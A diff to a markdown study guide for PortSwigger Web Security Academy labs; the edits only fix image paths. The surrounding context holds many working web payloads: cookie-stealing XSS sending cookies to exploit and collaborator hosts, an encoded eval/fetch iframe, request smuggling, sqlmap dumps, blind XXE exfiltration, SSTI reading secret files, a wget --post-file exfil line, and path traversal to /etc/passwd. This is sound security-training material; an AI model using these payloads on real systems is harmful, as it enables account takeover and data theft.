@@ -98,7 +98,7 @@ X-Forwarded-Host: exploit-SERVER.exploit-server.net
 
 ```  
 
-![tracking.js](images\tracking.js.png)  
+![tracking.js](images/tracking.js.png)  
 
 >Hosting the following **on exploit server, injecting the **X-Forwarded-Host** header in request, and poison the cache until victim hits poison cache.  
 
@@ -106,7 +106,7 @@ X-Forwarded-Host: exploit-SERVER.exploit-server.net
  /resources/js/tracking.js 
 ```  
   
-![exploit host tracking.js](images\exploit-host-tracking-js.png)  
+![exploit host tracking.js](images/exploit-host-tracking-js.png)  
   
 ```javascript
 document.location='https://exploit.exploit-server.net/cookies?c='+document.cookie;
@@ -114,7 +114,7 @@ document.location='https://exploit.exploit-server.net/cookies?c='+document.cooki
 
 >Keep **Poisoning** the web cache of target by resending request with **X-Forwarded-Host** header.  
 
-![x-cache-hit.png](images\x-cache-hit.png)  
+![x-cache-hit.png](images/x-cache-hit.png)  
 
 [PortSwigger Lab: Web cache poisoning with an unkeyed header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)  
 
@@ -202,14 +202,14 @@ ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20v
   
 >The image below shows Burp Collaborator receiving the victim cookie as a base64 result.  
 
-![Burp collaborator receiving request with base64 cookie value from our POC.](images\xss2.png)  
+![Burp collaborator receiving request with base64 cookie value from our POC.](images/xss2.png)  
 
 >Hosting the **IFRAME** with eval() and fetch() payload on exploit server, respectively base64 encoded and URL encoded.  
 
 ```html
 <iframe src="https://TARGET.web-security-academy.net/?SearchTerm=%22%2b%65%76%61%6c%28%61%74%6f%62%28%22%5a%6d%56%30%59%32%67%6f%49%6d%68%30%64%48%42%7a%4f%69%38%76%4f%44%4d%35%59%32%74%30%64%54%64%31%62%32%64%6c%5a%47%30%32%59%54%46%72%61%6e%56%35%4d%32%39%31%64%47%78%36%59%32%34%79%59%6e%49%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%76%50%32%4d%39%49%69%41%72%49%47%4a%30%62%32%45%6f%5a%47%39%6a%64%57%31%6c%62%6e%52%62%4a%32%4e%76%62%32%74%70%5a%53%64%64%4b%53%6b%3d%22%29%29%7d%2f%2f"/>
 ```
-![(Deliver reflected xss to steal victim cookie.](xss1.png)  
+![(Deliver reflected xss to steal victim cookie.](images/xss1.png)  
 
 >Decode above payload from url encoding, is the following:  
 
@@ -250,7 +250,7 @@ document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" 
 </script>
 ```  
 
-![Stored XSS Blog post](stored-xss-blog-post.png)  
+![Stored XSS Blog post](images/stored-xss-blog-post.png)  
 
 >**Fetch API** JavaScript Cookie Stealer payload in Blog post comment.  
 
@@ -287,7 +287,7 @@ body:document.cookie
 {{$on.constructor('alert(1)')()}}
 ```  
 
-![domxss-on-constructor.png](domxss-on-constructor.png)  
+![domxss-on-constructor.png](images/domxss-on-constructor.png)  
 
 [PortSwigger Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)  
 
@@ -297,11 +297,11 @@ body:document.cookie
 /product?productId=1&storeId="></select><img%20src=1%20onerror=alert(document.cookie)>  
 ```  
 
-![get-dom-xss.png](get-dom-xss.png)  
+![get-dom-xss.png](images/get-dom-xss.png)  
 
 >Dom-based XSS request with inserted malicious code into the variable read by the target JavaScript.  
 
-![dom-xss](dom-xss.png)  
+![dom-xss](images/dom-xss.png)  
 
 [PortSwigger Lab: DOM XSS in document.write sink using source location.search inside a select element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)  
 
@@ -309,7 +309,7 @@ body:document.cookie
 
 >Using Dom Invader plugin and set the canary to value, such as 'domxss' and detect DOM-XSS sinks that can be exploit.  
 
-![DOM Invader](dom-invader.png)  
+![DOM Invader](images/dom-invader.png)  
 
 ## Host Header Poison - forgot-password
 
@@ -327,7 +327,7 @@ X-Forwarded-Server: EXPLOIT-SERVER-ID.exploit-server.net
 
 <sup>Check the exploit server log to obtain the reset link to the victim username.</sup>  
   
-![Exploit Server Logs capture the forgot password reset token](HOST-Header-forgot-password-reset.PNG)  
+![Exploit Server Logs capture the forgot password reset token](images/HOST-Header-forgot-password-reset.PNG)  
 
 [PortSwigger Lab: Password reset poisoning via middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)  
 
@@ -358,7 +358,7 @@ csrf=YOUR-CSRF-TOKEN&username=carlos
 
 >Observe that the second request has successfully accessed the admin panel.  
 
-![single connection](single-connection.png)  
+![single connection](images/single-connection.png)  
 
 [PortSwigger Lab: Host validation bypass via connection state attack](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack)  
 
@@ -369,7 +369,7 @@ csrf=YOUR-CSRF-TOKEN&username=carlos
   
 >Manually fixing the length fields in request smuggling attacks, requires each chunk size in bytes expressed in **HEXADECIMAL**, and **Content-Length** specifies the length of the message body in **bytes**. Chunks are followed by a **newline**, then followed by the chunk contents. The message is terminated with a chunk of size ZERO.  
 
-![TE-CL-http-request-smuggle.png](TE-CL-http-request-smuggle.png)  
+![TE-CL-http-request-smuggle.png](images/TE-CL-http-request-smuggle.png)  
 
 >Above TE.CL (Transfer-Encoding / Content-Length) smuggle request count in **HEXADECIMAL** and the payload is between the hex length of **71** and the terminated ZERO, not including the ZERO as part of counting the payload length. The inital POSt request **content-length** is manually set.  
   
@@ -397,13 +397,13 @@ Cookie: session=HackerCurrentCookieValue
 csrf=ValidCSRFCookieValue&postId=8&name=c&email=c%40c.c&website=&comment=c
 ```  
   
-![Exploiting HTTP request smuggling with content-length value](content-length-capture-victim-request.png)  
+![Exploiting HTTP request smuggling with content-length value](images/content-length-capture-victim-request.png)  
 
 <sub>No new line at end of the smuggled POST request above^^ </sub>  
 
 >View the blog **post** to see if there's a comment containing a user's request. Note that once the victim user browses the target website, then only will the attack be successful. Copy the user's Cookie header from the blog post comment, and use the cookie to access victim's account.  
   
-![Exploiting HTTP request smuggling to capture other users' requests](victim-request-captured-blog-comment.png)  
+![Exploiting HTTP request smuggling to capture other users' requests](images/victim-request-captured-blog-comment.png)  
 
 [PortSwigger Lab: Exploiting HTTP request smuggling to capture other users' requests](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)  
 
@@ -442,11 +442,11 @@ Content-Length: 5
 x=1
 ```  
 
-![HTTP request smuggling to deliver reflected XSS and steal victim cookie](user-agent-cookie-stealer-smuggled.PNG)  
+![HTTP request smuggling to deliver reflected XSS and steal victim cookie](images/user-agent-cookie-stealer-smuggled.PNG)  
 
 >Check the PortSwigger Collaborator Request received from victim browsing target.  
   
-![Collaborator capture xss Request from victim browsing target](collaborator-xss-Request-received.png)  
+![Collaborator capture xss Request from victim browsing target](images/collaborator-xss-Request-received.png)  
 
 [PortSwigger Lab: Exploiting HTTP request smuggling to deliver reflected XSS](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)  
 
@@ -504,11 +504,11 @@ Connection: close
 }
 ```  
 
-![Intruder Payload set to identify Admin role ID](intruder-payload-positions.png)  
+![Intruder Payload set to identify Admin role ID](images/intruder-payload-positions.png)  
 
 >Attack identify the possible role ID of administrator access role and then send this request with updated roleId to privile escalate the current logged in user to role of administator of target.  
 
-![Attack identify Admin role ID](admin-roleid-privesc.png)  
+![Attack identify Admin role ID](images/admin-roleid-privesc.png)  
 
 [PortSwigger Lab: User role can be modified in user profile](https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile)  
 
@@ -541,7 +541,7 @@ Connection: close
 csrf=TOKEN&username=administrator
 ```  
 
-![CSRF privesc](csrf-privesc.png)  
+![CSRF privesc](images/csrf-privesc.png)  
 
 [PortSwigger Lab: Password reset broken logic](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)  
 
@@ -549,7 +549,7 @@ csrf=TOKEN&username=administrator
 
 >Cookie value contain the password of the user logged in and is vulnerable to brute-forcing.  
 
-![brute](brute.png)  
+![brute](images/brute.png)  
 
 >Intruder Payload processing, add grep option and the rules in sequenctial order before attack is submitted.  
 1. Hash: MD5  
@@ -574,7 +574,7 @@ grep 'Update email'
 
 [SQL Injection cheat sheet examples](https://portswigger.net/web-security/sql-injection/cheat-sheet)  
 
-![Identify the input parameter vulnerable to SQL injection](identify-sqli-parameter.png)  
+![Identify the input parameter vulnerable to SQL injection](images/identify-sqli-parameter.png)  
 
 >Out of band data exfiltration Blind SQL query, namely a tracking cookie.  
 
@@ -619,7 +619,7 @@ sqlmap -v -u 'https://TARGET.web-security-academy.net/filter?category=*' -p "cat
 
 ```  
 
-![SQLMAP used to dump data from tables](sqlmap-dump-table-data.png)
+![SQLMAP used to dump data from tables](images/sqlmap-dump-table-data.png)
 
 
 >Use SQLMAP Technique parameter set type to error based instead of boolean-based blind vulnerability, and this speed up data exfil process.  
@@ -648,7 +648,7 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 '+UNION+SELECT+username_wrrcyp,+password_zwjmpc+FROM+users_qoixrv--
 ``` 
 
-![manual-sqli.png](manual-sqli.png)  
+![manual-sqli.png](images/manual-sqli.png)  
 
 [PortSwigger Lab: SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)  
 
@@ -667,7 +667,7 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 %26entity;
 ```  
 
-![Identify XML Injections](identify-xxe.png)
+![Identify XML Injections](images/identify-xxe.png)
 
 ### DTD Hosted Exploit  
 
@@ -680,7 +680,7 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 %exfil;
 ```  
   
-![Exploit.DTD file hosted](exploit.dtd.png)  
+![Exploit.DTD file hosted](images/exploit.dtd.png)  
 
 >Modify the file upload XML body of the request before sending to the target server.  
 
@@ -696,7 +696,7 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 
 ```
 
-![Exploiting blind XXE to exfiltrate data usding a mlicious exploit DTD file](blind-xxe-exploit-dtd.png)  
+![Exploiting blind XXE to exfiltrate data usding a mlicious exploit DTD file](images/blind-xxe-exploit-dtd.png)  
 
 [PortSwigger Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)  
 
@@ -708,7 +708,7 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/carlos/secret"/></foo>  
 ```  
 
-![XInclude to retrieve files](xinclude.png)  
+![XInclude to retrieve files](images/xinclude.png)  
 
 [PortSwigger Lab: Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)  
 
@@ -719,7 +719,7 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 
 >Identify injection point by using mathematical expression such as **7x7**, and this indicate possible SQL injection or Template injections.
 
-![identify-math-evaluated-xml](identify-math-evaluated-xml.png)  
+![identify-math-evaluated-xml](images/identify-math-evaluated-xml.png)  
 
 >WAF detect attack when appending SQL query such as a UNION SELECT statement to the original store ID.  
 
@@ -729,7 +729,7 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 
 >Bypass the WAF, Use Burp extension **Hackvertor** to [obfuscate](#obfuscation) the SQL Injection payload in the XML post body. 
 
-![Web application firewall (WAF) bypass require obfuscate of malicious query with Hackvertor](hackvertor.png)  
+![Web application firewall (WAF) bypass require obfuscate of malicious query with Hackvertor](images/hackvertor.png)  
 
 >Webapp return one column, thus need to concatenate the returned usernames and passwords columns from the users table.  
  
@@ -737,7 +737,7 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
 ```  
 
-![SQL injection with filter bypass via XML encoding obfuscation](xml-sql-obfuscation.png)  
+![SQL injection with filter bypass via XML encoding obfuscation](images/xml-sql-obfuscation.png)  
 
 >SQLi Payloads to read local file, and or output to another folder on target.  
 
@@ -808,7 +808,7 @@ http://127.1:6566/admin
 
 >Double URL encode characters in URL such as to Obfuscate the "a" by double-URL encoding it to %2561  
 
-![ssrf obfuscated](ssrf-obfuscated.png)  
+![ssrf obfuscated](images/ssrf-obfuscated.png)  
 
 [PortSwigger Lab: SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)  
 
@@ -822,11 +822,11 @@ GET https://YOUR-LAB-ID.web-security-academy.net/
 Host: COLLABORATOR.DOMAIN
 ```  
 
-![identify-ssrf-host](identify-ssrf-host.png)  
+![identify-ssrf-host](images/identify-ssrf-host.png)  
 
 >Use the Host header to target 192.168.0.141 or localhost, and notice the response give 302 status admin interface found. Append /admin to the absolute URL in the request line and send the request. Observe SSRF response.  
 
-![ssrf](ssrf.png)  
+![ssrf](images/ssrf.png)  
 
 [PortSwigger Lab: SSRF via flawed request parsing](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing)  
 
@@ -849,7 +849,7 @@ Content-Length: 206
 }  
 ```  
 
-![ssrf_redirect_uris.png](ssrf_redirect_uris.png)  
+![ssrf_redirect_uris.png](images/ssrf_redirect_uris.png)  
 
 [PortSwigger Lab: SSRF via OpenID dynamic client registration](https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration)  
 
@@ -871,7 +871,7 @@ Content-Length: 206
   </stockCheck>  
 ```  
 
-![xxe-ssrf-localhost.png](xxe-ssrf-localhost.png)  
+![xxe-ssrf-localhost.png](images/xxe-ssrf-localhost.png)  
 
 [PortSwigger Lab: Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)  
 
@@ -887,7 +887,7 @@ Host: localhost
 
 <sub>**Note:** Convert the GET request to POST</sub>  
 
-![Routing-based SSRF](Routing-based-SSRF.png)  
+![Routing-based SSRF](images/Routing-based-SSRF.png)  
 
 ```html
 POST / HTTP/1.1
@@ -991,7 +991,7 @@ ${foobar}
 
 >Identification of template injection.  
 
-![Identify SSTI](identify-ssti.png)  
+![Identify SSTI](images/identify-ssti.png)  
 
 >Tornado Template  
 
@@ -1003,7 +1003,7 @@ ${foobar}
 blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('cat%20/home/carlos/secret')
 ```  
 
-![Tornado Template](tornado-template.png)  
+![Tornado Template](images/tornado-template.png)  
 
 [PortSwigger Lab: Basic server-side template injection data exfiltrate](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)  
 
@@ -1015,7 +1015,7 @@ ${{<%[%'"}}%\,
 {{settings.SECRET_KEY}}
 ```  
 
-![Django template](django-template.png)  
+![Django template](images/django-template.png)  
 
 [PortSwigger Lab: Server-side template injection with information disclosure via user-supplied objects](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)  
 
@@ -1026,7 +1026,7 @@ ${foobar}
 <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /home/carlos/secret") }
 ```  
 
-![Freemarker template](freemarker-template.png)  
+![Freemarker template](images/freemarker-template.png)  
 
 [PortSwigger Lab: Server-side template injection using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)  
 
@@ -1038,7 +1038,7 @@ ${foobar}
 <%= system("cat /home/carlos/secret") %>
 ```  
 
-![ERB template](erb-template.png)  
+![ERB template](images/erb-template.png)  
 
 [PortSwigger Lab: Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)  
 
@@ -1071,7 +1071,7 @@ wrtz{{#with "s" as |string|}}
 {{/with}}
 ```
 
-![Handlebars template](handlebars-template.png)  
+![Handlebars template](images/handlebars-template.png)  
 
 [PortSwigger Lab: Server-side template injection in an unknown language](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)  
 
@@ -1107,7 +1107,7 @@ wget http://ext.burpcollab.net --post-file=/home/carlos/secret
 
 [PortSwigger Lab: Client-side prototype pollution in third-party libraries](https://portswigger.net/web-security/prototype-pollution/finding/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)
 
-![Proto pollution](proto-pollution.png)  
+![Proto pollution](images/proto-pollution.png)  
 
 <sup> Proto pollution section is incomplete ...need more input...</sup>  
 
@@ -1146,7 +1146,7 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
 }
 ```  
 
-![jwt](jwt.png)  
+![jwt](images/jwt.png)  
 
 [PortSwigger Lab: JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)  
 
@@ -1158,7 +1158,7 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
   
 >oAuth linking exploit server hosting iframe, then deliver to victim, forcing user to update code linked.  
 
-![csrf](csrf.png)  
+![csrf](images/csrf.png)  
 
 >Intercepted the GET /oauth-linking?code=[...]. send to repeat to save code. Drop the request. Important to ensure that the code is not used and, remains valid. Save on exploit server an iframe in which the src attribute points to the URL you just copied.  
 
@@ -1203,7 +1203,7 @@ Referrer-Policy: unsafe-url
 
 >When above exploit payload body CSRF delivered to victim, it changes victim email to test@test.com.  
 
-![referer csrf](referer-csrf.png)  
+![referer csrf](images/referer-csrf.png)  
 
 [PortSwigger Lab: CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)  
 
@@ -1216,7 +1216,7 @@ Referrer-Policy: unsafe-url
 GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
 ```  
 
-![URL encode path traverse](encode-path-traverse.png)  
+![URL encode path traverse](images/encode-path-traverse.png)  
 
 >Burp Intruder provides a predefined payload list (Fuzzing - path traversal).  
 
@@ -1228,7 +1228,7 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
 
 >Due to the tight time limit during engagements, scan defined insertion points for specific requests.  
 
-![scan-defined-insertion-points](scan-defined-insertion-points.png)  
+![scan-defined-insertion-points](images/scan-defined-insertion-points.png)  
 
 >Scanner detected xmlns on stockId parameter and can lead to reading file on host parse text.  
 
